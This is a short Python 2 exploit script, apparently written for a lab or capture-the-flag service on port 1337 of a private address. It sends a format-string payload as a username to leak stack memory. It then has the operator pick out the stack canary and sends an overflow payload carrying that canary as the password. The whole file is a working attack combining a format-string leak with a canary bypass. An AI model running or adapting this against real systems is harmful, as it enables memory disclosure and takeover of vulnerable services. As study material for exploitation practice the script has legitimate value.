import struct 
import socket 
import time

def send(socket, packet):
    s.send(packet+"\n")

target_ip = "192.168.1.66"

s = socket.socket()
s.connect((target_ip, 1337))

raw_input("Exploit ?")

r = s.recv(1024)
print ">Server> " + r
time.sleep(1)
nb_stack_val = raw_input("Exploit : How many stack values to print ? : ")
send(s, "%lx,"*int(nb_stack_val)) # username
r = s.recv(2048)

target_memory = r.split(",")
print "Exploit : Leaked target memory..."
do_print_target_memory = raw_input("Exploit : Show all target memory ? [Y/n] : ")

if do_print_target_memory == "Y":
    i = -1
    for elem in target_memory:
        i += 1
        print i, ": "+elem+"\n",
        
print "Exploit : String values found in the memory : "
i = -1
for elem in target_memory:
    i += 1
    try:
        print i, ": " + elem.decode("hex")[::-1] + "|",
    except Exception:
        pass
print "\n"
index = raw_input("Exploit : At what index is the stack canary value ? : ")
    
stack_canary_value = target_memory[int(index)].decode("hex")[::-1]
print stack_canary_value
time.sleep(1)
send(s, "\x00"*(20+4)+stack_canary_value+"\x00"*10) # password

r = s.recv(1024)
print ">Server> " + r
